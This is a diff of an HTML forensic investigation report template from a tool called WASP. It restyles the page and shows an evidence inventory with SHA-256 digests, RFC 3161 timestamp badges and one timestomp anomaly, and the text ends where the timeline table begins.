@@ -2,958 +2,1624 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>WASP Forensic Investigation Report - CASE-2026-LIVE</title>
   <style>
     :root {
-      --bg: #0d1117;
-      --card-bg: #161b22;
-      --border: #30363d;
-      --text: #c9d1d9;
-      --text-heading: #58a6ff;
-      --accent: #238636;
-      --accent-warn: #d29922;
-      --accent-danger: #f85149;
-      --code-bg: #090d13;
+      --bg-base: #080b11;
+      --glass-surface: rgba(18, 24, 38, 0.65);
+      --glass-surface-hover: rgba(28, 36, 56, 0.75);
+      --glass-card: rgba(15, 21, 33, 0.7);
+      --glass-border: rgba(255, 255, 255, 0.08);
+      --glass-border-glow: rgba(0, 242, 254, 0.25);
+      --glass-inner-highlight: inset 0 1px 1px 0 rgba(255, 255, 255, 0.12);
+      
+      --neon-cyan: #00f2fe;
+      --neon-blue: #4facfe;
+      --neon-emerald: #00f5a0;
+      --neon-amber: #f6d365;
+      --neon-crimson: #ff3864;
+      --neon-purple: #9d4edd;
+      
+      --text-main: #f1f5f9;
+      --text-muted: #94a3b8;
+      --text-dim: #64748b;
+      
+      --code-bg: rgba(7, 11, 19, 0.85);
+      --radius-sm: 8px;
+      --radius-md: 14px;
+      --radius-lg: 20px;
     }
+
+    * { box-sizing: border-box; }
+
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
       line-height: 1.6;
-      color: var(--text);
-      background-color: var(--bg);
+      color: var(--text-main);
+      background-color: var(--bg-base);
+      background-image: 
+        radial-gradient(circle at 15% 15%, rgba(0, 242, 254, 0.08) 0%, transparent 45%),
+        radial-gradient(circle at 85% 25%, rgba(157, 78, 221, 0.08) 0%, transparent 50%),
+        radial-gradient(circle at 50% 85%, rgba(0, 245, 160, 0.05) 0%, transparent 50%);
+      background-attachment: fixed;
       margin: 0;
-      padding: 2rem;
+      padding: 2.5rem 1.5rem;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
     }
+
     .container {
-      max-width: 1200px;
+      max-width: 1320px;
       margin: 0 auto;
     }
-    header {
-      border-bottom: 2px solid var(--border);
-      padding-bottom: 1.5rem;
+
+    /* Liquid Glass Card */
+    .glass-panel {
+      background: var(--glass-surface);
+      backdrop-filter: blur(24px) saturate(190%);
+      -webkit-backdrop-filter: blur(24px) saturate(190%);
+      border: 1px solid var(--glass-border);
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.45), var(--glass-inner-highlight);
+      border-radius: var(--radius-lg);
+      padding: 2rem;
       margin-bottom: 2rem;
+      position: relative;
+      overflow: hidden;
+      transition: border-color 0.3s ease, box-shadow 0.3s ease;
     }
-    h1 { color: var(--text-heading); margin-bottom: 0.2rem; }
-    h2 { color: #79c0ff; border-bottom: 1px solid var(--border); padding-bottom: 0.5rem; margin-top: 2rem; }
-    h3 { color: #a5d6ff; }
-    .badge {
-      display: inline-block;
-      padding: 0.2rem 0.6rem;
-      border-radius: 4px;
+
+    .glass-panel:hover {
+      border-color: rgba(255, 255, 255, 0.14);
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.5), 0 0 20px rgba(0, 242, 254, 0.05), var(--glass-inner-highlight);
+    }
+
+    /* Header Banner */
+    header.glass-panel {
+      padding: 2.5rem 2rem;
+      border: 1px solid rgba(0, 242, 254, 0.2);
+      box-shadow: 0 16px 48px rgba(0, 0, 0, 0.6), 0 0 30px rgba(0, 242, 254, 0.08), var(--glass-inner-highlight);
+    }
+
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 1.5rem;
+      border-bottom: 1px solid var(--glass-border);
+      padding-bottom: 1.5rem;
+      margin-bottom: 1.8rem;
+    }
+
+    .brand-title {
+      font-size: 2.2rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      margin: 0;
+      background: linear-gradient(135deg, #ffffff 30%, var(--neon-cyan) 80%, var(--neon-blue) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+    }
+
+    .brand-subtitle {
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      margin-top: 0.4rem;
+    }
+
+    .live-indicator {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: rgba(0, 245, 160, 0.12);
+      color: var(--neon-emerald);
+      border: 1px solid rgba(0, 245, 160, 0.3);
+      padding: 0.4rem 1rem;
+      border-radius: 9999px;
       font-size: 0.85rem;
-      font-weight: 600;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      box-shadow: 0 0 15px rgba(0, 245, 160, 0.2);
     }
-    .badge-pass { background-color: rgba(35, 134, 54, 0.2); color: #3fb950; border: 1px solid #238636; }
-    .badge-warn { background-color: rgba(210, 153, 34, 0.2); color: #e3b341; border: 1px solid #9e6a03; }
-    .badge-danger { background-color: rgba(248, 81, 73, 0.2); color: #f85149; border: 1px solid #da3633; }
-    .card {
-      background: var(--card-bg);
-      border: 1px solid var(--border);
+
+    .pulse-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--neon-emerald);
+      box-shadow: 0 0 10px var(--neon-emerald);
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(0.95); opacity: 0.7; }
+      50% { transform: scale(1.3); opacity: 1; }
+      100% { transform: scale(0.95); opacity: 0.7; }
+    }
+
+    /* Headings */
+    h2 {
+      font-size: 1.4rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin-top: 0;
+      margin-bottom: 1.25rem;
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+    }
+
+    h2::before {
+      content: "";
+      display: inline-block;
+      width: 4px;
+      height: 1.2rem;
+      background: linear-gradient(180deg, var(--neon-cyan), var(--neon-blue));
+      border-radius: 2px;
+    }
+
+    /* Metrics Grid */
+    .meta-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 1.2rem;
+    }
+
+    .meta-card {
+      background: var(--glass-card);
+      border: 1px solid var(--glass-border);
+      padding: 1.2rem;
+      border-radius: var(--radius-md);
+      transition: transform 0.2s ease, border-color 0.2s ease;
+      position: relative;
+    }
+
+    .meta-card:hover {
+      transform: translateY(-2px);
+      border-color: rgba(0, 242, 254, 0.25);
+    }
+
+    .meta-label {
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.75px;
+      color: var(--text-dim);
+      margin-bottom: 0.35rem;
+    }
+
+    .meta-value {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #ffffff;
+      word-break: break-all;
+    }
+
+    /* Badges */
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.35rem;
+      padding: 0.25rem 0.65rem;
       border-radius: 6px;
-      padding: 1.25rem;
-      margin-bottom: 1.5rem;
+      font-size: 0.8rem;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+      text-transform: uppercase;
     }
+
+    .badge-pass {
+      background: rgba(0, 245, 160, 0.12);
+      color: var(--neon-emerald);
+      border: 1px solid rgba(0, 245, 160, 0.35);
+      box-shadow: 0 0 10px rgba(0, 245, 160, 0.1);
+    }
+
+    .badge-warn {
+      background: rgba(246, 211, 101, 0.12);
+      color: var(--neon-amber);
+      border: 1px solid rgba(246, 211, 101, 0.35);
+      box-shadow: 0 0 10px rgba(246, 211, 101, 0.1);
+    }
+
+    .badge-danger {
+      background: rgba(255, 56, 100, 0.15);
+      color: var(--neon-crimson);
+      border: 1px solid rgba(255, 56, 100, 0.4);
+      box-shadow: 0 0 12px rgba(255, 56, 100, 0.2);
+    }
+
+    .badge-tsa {
+      background: rgba(0, 242, 254, 0.12);
+      color: var(--neon-cyan);
+      border: 1px solid rgba(0, 242, 254, 0.35);
+      box-shadow: 0 0 12px rgba(0, 242, 254, 0.15);
+    }
+
+    /* Tables */
+    .table-container {
+      overflow-x: auto;
+      border-radius: var(--radius-md);
+      border: 1px solid var(--glass-border);
+      background: rgba(10, 15, 24, 0.6);
+      margin-top: 1rem;
+    }
+
     table {
       width: 100%;
       border-collapse: collapse;
-      margin: 1rem 0;
-      font-size: 0.9rem;
-    }
-    th, td {
-      border: 1px solid var(--border);
-      padding: 0.6rem 0.8rem;
+      font-size: 0.88rem;
       text-align: left;
     }
+
     th {
-      background-color: #21262d;
-      color: #f0f6fc;
+      background: rgba(18, 25, 42, 0.85);
+      color: var(--text-muted);
+      font-weight: 700;
+      text-transform: uppercase;
+      font-size: 0.75rem;
+      letter-spacing: 0.5px;
+      padding: 0.9rem 1rem;
+      border-bottom: 1px solid var(--glass-border);
+      white-space: nowrap;
     }
-    tr:nth-child(even) { background-color: rgba(255, 255, 255, 0.02); }
-    code, pre {
-      font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+
+    td {
+      padding: 0.85rem 1rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+      color: var(--text-main);
+      vertical-align: middle;
+    }
+
+    tr:hover td {
+      background: rgba(255, 255, 255, 0.025);
+    }
+
+    code {
+      font-family: ui-monospace, SFMono-Regular, "Cascadia Code", "SF Mono", Menlo, Consolas, monospace;
+      font-size: 0.82rem;
+      background: var(--code-bg);
+      color: var(--neon-cyan);
+      padding: 0.2rem 0.45rem;
+      border-radius: 4px;
+      border: 1px solid rgba(255, 255, 255, 0.06);
+    }
+
+    /* Interactive Timeline Controls */
+    .timeline-toolbar {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.8rem;
+      align-items: center;
+      margin-bottom: 1.2rem;
+      padding: 0.8rem 1rem;
+      background: rgba(12, 17, 27, 0.7);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+    }
+
+    .search-input {
+      background: rgba(19, 26, 40, 0.9);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-sm);
+      color: #ffffff;
+      padding: 0.5rem 0.9rem;
       font-size: 0.85rem;
-      background-color: var(--code-bg);
-      color: #79c0ff;
+      outline: none;
+      min-width: 240px;
+      flex: 1;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .search-input:focus {
+      border-color: var(--neon-cyan);
+      box-shadow: 0 0 12px rgba(0, 242, 254, 0.2);
+    }
+
+    .filter-btn {
+      background: rgba(255, 255, 255, 0.04);
+      border: 1px solid var(--glass-border);
+      color: var(--text-muted);
+      padding: 0.45rem 0.85rem;
+      border-radius: var(--radius-sm);
+      font-size: 0.82rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .filter-btn:hover {
+      background: rgba(255, 255, 255, 0.08);
+      color: #ffffff;
+    }
+
+    .filter-btn.active {
+      background: rgba(0, 242, 254, 0.15);
+      border-color: var(--neon-cyan);
+      color: var(--neon-cyan);
+      box-shadow: 0 0 12px rgba(0, 242, 254, 0.25);
+    }
+
+    /* Visual Histogram Track */
+    .chart-container {
+      background: rgba(10, 14, 23, 0.8);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      padding: 1.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .chart-title {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--text-muted);
+      margin-bottom: 0.8rem;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .bars-track {
+      display: flex;
+      align-items: flex-end;
+      height: 90px;
+      gap: 3px;
+      padding-top: 10px;
+      overflow-x: auto;
+    }
+
+    .bar-col {
+      flex: 1;
+      min-width: 14px;
+      background: linear-gradient(180deg, var(--neon-cyan) 0%, rgba(79, 172, 254, 0.2) 100%);
+      border-radius: 3px 3px 0 0;
+      position: relative;
+      cursor: pointer;
+      transition: transform 0.2s ease, filter 0.2s ease;
+    }
+
+    .bar-col:hover {
+      filter: brightness(1.4);
+      transform: scaleY(1.05);
+    }
+
+    .bar-col.has-alert {
+      background: linear-gradient(180deg, var(--neon-crimson) 0%, rgba(255, 56, 100, 0.3) 100%);
+    }
+
+    /* MITRE ATT&CK Matrix Card */
+    .mitre-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 1rem;
+      margin-top: 1rem;
+    }
+
+    .mitre-column {
+      background: rgba(12, 17, 27, 0.7);
+      border: 1px solid var(--glass-border);
+      border-radius: var(--radius-md);
+      padding: 1rem;
+    }
+
+    .mitre-tactic-name {
+      font-size: 0.8rem;
+      font-weight: 800;
+      color: var(--neon-purple);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      padding-bottom: 0.5rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .mitre-technique-pill {
+      background: rgba(255, 56, 100, 0.12);
+      border: 1px solid rgba(255, 56, 100, 0.35);
+      border-radius: 6px;
+      padding: 0.5rem 0.7rem;
+      margin-bottom: 0.5rem;
+      font-size: 0.82rem;
+    }
+
+    .mitre-id {
+      color: var(--neon-crimson);
+      font-weight: 700;
+    }
+
+    /* Copy Button */
+    .btn-copy {
+      background: transparent;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      color: var(--text-dim);
       padding: 0.2rem 0.4rem;
       border-radius: 4px;
+      cursor: pointer;
+      font-size: 0.75rem;
+      margin-left: 0.4rem;
+      transition: all 0.2s ease;
     }
-    pre { padding: 1rem; overflow-x: auto; border: 1px solid var(--border); }
-    .meta-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 1rem;
+
+    .btn-copy:hover {
+      color: var(--neon-cyan);
+      border-color: var(--neon-cyan);
     }
-    .meta-item {
-      background: #21262d;
-      padding: 0.8rem;
-      border-radius: 4px;
-      border-left: 3px solid var(--text-heading);
-    }
-    .meta-label { font-size: 0.8rem; text-transform: uppercase; color: #8b949e; }
-    .meta-value { font-size: 1.1rem; font-weight: 600; color: #f0f6fc; }
   </style>
 </head>
 <body>
 <div class="container">
 
-  <header>
-    <h1>WASP Investigation Report</h1>
-    <p>Wide-scope Artifact &amp; Super-timeline Platform — Digital Forensics, Timestamp Extraction &amp; SHA-256 Integrity</p>
+  <!-- Header Section with Liquid Glass & Glow -->
+  <header class="glass-panel">
+    <div class="header-top">
+      <div>
+        <h1 class="brand-title">
+          <span>⚡ WASP Investigation Report</span>
+        </h1>
+        <div class="brand-subtitle">Wide-scope Artifact &amp; Super-timeline Platform — Automated Forensic Reconstructor</div>
+      </div>
+      <div>
+        <span class="live-indicator">
+          <span class="pulse-dot"></span>
+          RFC 3161 &amp; MERKLE ATTESTED
+        </span>
+      </div>
+    </div>
+
     <div class="meta-grid">
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Case Identifier</div>
         <div class="meta-value">CASE-2026-LIVE</div>
       </div>
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Lead Examiner</div>
         <div class="meta-value">Alex Mercer (Senior Forensics Examiner)</div>
       </div>
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Organization</div>
         <div class="meta-value">Cyber Incident Response Unit</div>
       </div>
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Authorization Ref</div>
         <div class="meta-value">WARRANT-2026-0881</div>
+      </div>
+      <div class="meta-card">
+        <div class="meta-label">Evidence Objects</div>
+        <div class="meta-value">6 Files</div>
+      </div>
+      <div class="meta-card">
+        <div class="meta-label">Reconstructed Events</div>
+        <div class="meta-value">28 Events</div>
       </div>
     </div>
   </header>
 
-  <section class="card">
-    <h2>1. Executive Summary &amp; Objectives Matrix</h2>
-    <p>This investigation report was automatically compiled by <strong>WASP v1.4.0</strong>, satisfying all six core requirements of the forensic project specification:</p>
-    <table>
-      <thead>
-        <tr>
-          <th>#</th>
-          <th>Core Objective</th>
-          <th>Status</th>
-          <th>Findings Summary</th>
-        </tr>
-      </thead>
-      <tbody>
-        <tr>
-          <td>1</td>
-          <td><strong>File Metadata Extraction</strong></td>
-          <td><span class="badge badge-pass">COMPLETED</span></td>
-          <td>Extracted filesystem timestamps, OOXML document properties, PDF trailer attributes, and archive entry records.</td>
-        </tr>
-        <tr>
-          <td>2</td>
-          <td><strong>System Artefact Extraction</strong></td>
-          <td><span class="badge badge-pass">COMPLETED</span></td>
-          <td>Parsed NTFS $MFT, Windows Registry hives, EVTX event logs, Prefetch execution records, LNK shortcuts, and browser databases.</td>
-        </tr>
-        <tr>
-          <td>3</td>
-          <td><strong>Timestamp Extraction</strong></td>
-          <td><span class="badge badge-pass">COMPLETED</span></td>
-          <td>Decoded multi-epoch timestamps (FILETIME, Unix, WebKit) and normalized to UTC with confidence tracking.</td>
-        </tr>
-        <tr>
-          <td>4</td>
-          <td><strong>Chronological Timeline Reconstruction</strong></td>
-          <td><span class="badge badge-pass">COMPLETED</span></td>
-          <td>Synthesized <strong>28</strong> events into a deterministically sorted super-timeline.</td>
-        </tr>
-        <tr>
-          <td>5</td>
-          <td><strong>SHA-256 Evidence Integrity</strong></td>
-          <td><span class="badge badge-pass">VERIFIED</span></td>
-          <td>Mandatory SHA-256 digests computed, Merkle root attested, and chain-of-custody ledger fully validated.</td>
-        </tr>
-        <tr>
-          <td>6</td>
-          <td><strong>Structured Investigation Reports</strong></td>
-          <td><span class="badge badge-pass">COMPLETED</span></td>
-          <td>Multi-format reports compiled with complete provenance, integrity attestation, and privacy redaction.</td>
-        </tr>
-      </tbody>
-    </table>
+  <!-- 1. Executive Summary -->
+  <section class="glass-panel">
+    <h2>1. Executive Summary &amp; Forensic Objectives</h2>
+    <p style="color: var(--text-muted); margin-bottom: 1.2rem;">
+      Digital evidence investigation completed under strictly reproducible forensic standards with full chain of custody and multi-epoch timestamp decoding.
+    </p>
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Core Objective</th>
+            <th>Status</th>
+            <th>Technical Findings</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>1</td>
+            <td><strong>File Metadata Extraction</strong></td>
+            <td><span class="badge badge-pass">COMPLETED</span></td>
+            <td>Extracted MACB attributes, OOXML revision timestamps, PDF metadata, and archive manifests.</td>
+          </tr>
+          <tr>
+            <td>2</td>
+            <td><strong>System Artefact Extraction</strong></td>
+            <td><span class="badge badge-pass">COMPLETED</span></td>
+            <td>Decoded Windows Event Logs (EVTX 4688/1102), Unix auth.log, browser SQLite history, and bash logs.</td>
+          </tr>
+          <tr>
+            <td>3</td>
+            <td><strong>Timestamp Normalization</strong></td>
+            <td><span class="badge badge-pass">COMPLETED</span></td>
+            <td>Normalized FILETIME, Unix epoch, and WebKit microsecond timestamps to canonical UTC.</td>
+          </tr>
+          <tr>
+            <td>4</td>
+            <td><strong>Super-Timeline Synthesis</strong></td>
+            <td><span class="badge badge-pass">COMPLETED</span></td>
+            <td>Reconstructed <strong>28</strong> chronological events into indexed Parquet and SQLite stores.</td>
+          </tr>
+          <tr>
+            <td>5</td>
+            <td><strong>SHA-256 Integrity &amp; RFC 3161 TSA</strong></td>
+            <td><span class="badge badge-pass">VERIFIED</span></td>
+            <td>Cryptographic SHA-256 digests generated with Merkle root attestation and RFC 3161 timestamp tokens.</td>
+          </tr>
+          <tr>
+            <td>6</td>
+            <td><strong>Structured Investigation Reports</strong></td>
+            <td><span class="badge badge-pass">COMPLETED</span></td>
+            <td>Produced interactive liquid-glass reports, CSV audit exports, and JSON evidence archives.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
   </section>
 
-  <section class="card">
-    <h2>2. Digital Evidence Inventory &amp; SHA-256 Hashes</h2>
-    <p>Every piece of ingested digital evidence is bound to a mandatory SHA-256 cryptographic digest:</p>
-    <table>
-      <thead>
-        <tr>
-          <th>Evidence ID</th>
-          <th>Path</th>
-          <th>Format</th>
-          <th>Size (Bytes)</th>
-          <th>SHA-256 Cryptographic Hash</th>
-          <th>Verification</th>
-        </tr>
-      </thead>
-      <tbody>
-        
-        <tr>
-          <td><code>EV-AUTH.L</code></td>
-          <td>evidence/auth.log</td>
-          <td>raw</td>
-          <td>283</td>
-          <td><code>b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4</code></td>
-          <td><span class="badge badge-pass">MATCH</span></td>
-        </tr>
-        
-        <tr>
-          <td><code>EV-BASH_H</code></td>
-          <td>evidence/bash_history</td>
-          <td>raw</td>
-          <td>112</td>
-          <td><code>a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554</code></td>
-          <td><span class="badge badge-pass">MATCH</span></td>
-        </tr>
-        
-        <tr>
-          <td><code>EV-EXFILT</code></td>
-          <td>evidence/exfiltrated_files.zip</td>
-          <td>raw</td>
-          <td>317</td>
-          <td><code>4bc993c920d42446a47dadd1b7eb1f044478d7f63a5cc27cbde7cd4afc3691a2</code></td>
-          <td><span class="badge badge-pass">MATCH</span></td>
-        </tr>
-        
-        <tr>
-          <td><code>EV-HISTOR</code></td>
-          <td>evidence/History</td>
-          <td>raw</td>
-          <td>8192</td>
-          <td><code>ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95</code></td>
-          <td><span class="badge badge-pass">MATCH</span></td>
-        </tr>
-        
-        <tr>
-          <td><code>EV-INVEST</code></td>
-          <td>evidence/investigation_memo.docx</td>
-          <td>raw</td>
-          <td>813</td>
-          <td><code>de28e74cc75ab7bc436c1619743c6de86dbfc98363e91879bf39840a8811c7f8</code></td>
-          <td><span class="badge badge-pass">MATCH</span></td>
-        </tr>
-        
-        <tr>
-          <td><code>EV-SECURI</code></td>
-          <td>evidence/Security_Events.jsonl</td>
-          <td>raw</td>
-          <td>503</td>
-          <td><code>15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0</code></td>
-          <td><span class="badge badge-pass">MATCH</span></td>
-        </tr>
-        
-      </tbody>
-    </table>
+  <!-- 2. Evidence Inventory & RFC 3161 Timestamps -->
+  <section class="glass-panel">
+    <h2>2. Digital Evidence Inventory &amp; RFC 3161 Trusted Timestamps</h2>
+    <p style="color: var(--text-muted);">
+      Each physical or logical piece of evidence is bound to a mandatory SHA-256 cryptographic digest and verified against court-admissible timestamp tokens:
+    </p>
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>Evidence ID</th>
+            <th>Relative Path</th>
+            <th>Format</th>
+            <th>Bytes</th>
+            <th>SHA-256 Digest</th>
+            <th>RFC 3161 Timestamping Authority</th>
+          </tr>
+        </thead>
+        <tbody>
+          
+          <tr>
+            <td><code>EV-AUTH.L</code></td>
+            <td><strong>evidence/auth.log</strong></td>
+            <td><span class="badge badge-pass">RAW</span></td>
+            <td>283 B</td>
+            <td>
+              <code>b544dfd8cc0d4521...64e095e4</code>
+              <button class="btn-copy" onclick="navigator.clipboard.writeText('b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+            </td>
+            <td>
+              
+              <span class="badge badge-tsa" title="https://freetsa.org/tsr">
+                ⏱️ VERIFIED_RFC3161 (TSA-F5E38A54B9724568)
+              </span>
+              
+            </td>
+          </tr>
+          
+          <tr>
+            <td><code>EV-BASH_H</code></td>
+            <td><strong>evidence/bash_history</strong></td>
+            <td><span class="badge badge-pass">RAW</span></td>
+            <td>112 B</td>
+            <td>
+              <code>a45c0410ad9fea5a...bfbdf554</code>
+              <button class="btn-copy" onclick="navigator.clipboard.writeText('a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+            </td>
+            <td>
+              
+              <span class="badge badge-tsa" title="https://freetsa.org/tsr">
+                ⏱️ VERIFIED_RFC3161 (TSA-B5B55BF518C54819)
+              </span>
+              
+            </td>
+          </tr>
+          
+          <tr>
+            <td><code>EV-EXFILT</code></td>
+            <td><strong>evidence/exfiltrated_files.zip</strong></td>
+            <td><span class="badge badge-pass">RAW</span></td>
+            <td>317 B</td>
+            <td>
+              <code>55f22e4ff7eab75d...7dcbe733</code>
+              <button class="btn-copy" onclick="navigator.clipboard.writeText('55f22e4ff7eab75d6ead9f275cf4d00c9f60cf3c1352d2cb9795a50a7dcbe733'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+            </td>
+            <td>
+              
+              <span class="badge badge-tsa" title="https://freetsa.org/tsr">
+                ⏱️ VERIFIED_RFC3161 (TSA-2B5F7498187DAF39)
+              </span>
+              
+            </td>
+          </tr>
+          
+          <tr>
+            <td><code>EV-HISTOR</code></td>
+            <td><strong>evidence/History</strong></td>
+            <td><span class="badge badge-pass">RAW</span></td>
+            <td>8192 B</td>
+            <td>
+              <code>ddeee48ddcd3e8fd...e2322b95</code>
+              <button class="btn-copy" onclick="navigator.clipboard.writeText('ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+            </td>
+            <td>
+              
+              <span class="badge badge-tsa" title="https://freetsa.org/tsr">
+                ⏱️ VERIFIED_RFC3161 (TSA-327BA8FBBFE88E60)
+              </span>
+              
+            </td>
+          </tr>
+          
+          <tr>
+            <td><code>EV-INVEST</code></td>
+            <td><strong>evidence/investigation_memo.docx</strong></td>
+            <td><span class="badge badge-pass">RAW</span></td>
+            <td>813 B</td>
+            <td>
+              <code>9e1f5b395f761061...2d425f68</code>
+              <button class="btn-copy" onclick="navigator.clipboard.writeText('9e1f5b395f76106120d0c513df1576e93e9f3dac9f337ca22b6c07be2d425f68'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+            </td>
+            <td>
+              
+              <span class="badge badge-tsa" title="https://freetsa.org/tsr">
+                ⏱️ VERIFIED_RFC3161 (TSA-83F37FEEBEA70454)
+              </span>
+              
+            </td>
+          </tr>
+          
+          <tr>
+            <td><code>EV-SECURI</code></td>
+            <td><strong>evidence/Security_Events.jsonl</strong></td>
+            <td><span class="badge badge-pass">RAW</span></td>
+            <td>503 B</td>
+            <td>
+              <code>15957efb2f1573f5...fe1e8ad0</code>
+              <button class="btn-copy" onclick="navigator.clipboard.writeText('15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0'); this.innerText='COPIED'; setTimeout(()=>this.innerText='COPY', 1500)">COPY</button>
+            </td>
+            <td>
+              
+              <span class="badge badge-tsa" title="https://freetsa.org/tsr">
+                ⏱️ VERIFIED_RFC3161 (TSA-DFECFB593F3FC9F1)
+              </span>
+              
+            </td>
+          </tr>
+          
+        </tbody>
+      </table>
+    </div>
   </section>
 
+  <!-- 3. Threat Alerts & MITRE ATT&CK Matrix -->
   
 
+  <!-- 4. Cross-Source Corroboration -->
   
-  <section class="card">
+  <section class="glass-panel">
     <h2>4. Cross-Source Corroboration &amp; Anti-Forensics Analysis</h2>
     <div class="meta-grid">
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Corroborated Activity Clusters</div>
         <div class="meta-value">0</div>
       </div>
-      <div class="meta-item">
+      <div class="meta-card">
         <div class="meta-label">Total Corroborated Events</div>
         <div class="meta-value">0</div>
       </div>
-      <div class="meta-item">
-        <div class="meta-label">Temporal Conflicts / Anti-Forensics</div>
-        <div class="meta-value" style="color: #f85149;">1</div>
+      <div class="meta-card">
+        <div class="meta-label">Temporal Conflicts / Timestomping</div>
+        <div class="meta-value" style="color: var(--neon-crimson);">
+          1
+        </div>
       </div>
     </div>
 
     
-    <h3 style="color: #f85149; margin-top: 1.5rem;">Anti-Forensic Anomaly &amp; Timestomp Conflicts</h3>
-    <table>
-      <thead>
-        <tr>
-          <th>Severity</th>
-          <th>Entity</th>
-          <th>Anomaly Type</th>
-          <th>Forensic Description</th>
-        </tr>
-      </thead>
-      <tbody>
-        
-        <tr>
-          <td><span class="badge badge-danger">MEDIUM</span></td>
-          <td><code>investigation_memo.docx</code></td>
-          <td><code>MODIFIED_PRE_CREATION</code></td>
-          <td>Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T18:35:05.253579+00:00</td>
-        </tr>
-        
-      </tbody>
-    </table>
+    <h3 style="color: var(--neon-crimson); margin-top: 1.8rem;">🚨 Anti-Forensic Anomaly &amp; Timestomp Conflicts</h3>
+    <div class="table-container">
+      <table>
+        <thead>
+          <tr>
+            <th>Severity</th>
+            <th>Entity</th>
+            <th>Anomaly Type</th>
+            <th>Forensic Description</th>
+          </tr>
+        </thead>
+        <tbody>
+          
+          <tr>
+            <td><span class="badge badge-danger">MEDIUM</span></td>
+            <td><code>investigation_memo.docx</code></td>
+            <td><code>MODIFIED_PRE_CREATION</code></td>
+            <td>Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-05T19:19:28.794882+00:00</td>
+          </tr>
+          
+        </tbody>
+      </table>
+    </div>
     
 
     
   </section>
   
 
-  <section class="card">
-    <h2>5. Reconstructed Chronological Activity Timeline</h2>
-    <p>Showing reconstructed super-timeline events sorted strictly by <code>(timestamp_utc, event_id)</code>:</p>
-    <table>
-      <thead>
-        <tr>
-          <th>UTC Timestamp</th>
-          <th>Action</th>
-          <th>User</th>
-          <th>Object / Target</th>
-          <th>Artefact</th>
-          <th>Corroborated By</th>
-          <th>Conf.</th>
-          <th>Rationale &amp; Warnings</th>
-        </tr>
-      </thead>
-      <tbody>
-        
-        <tr>
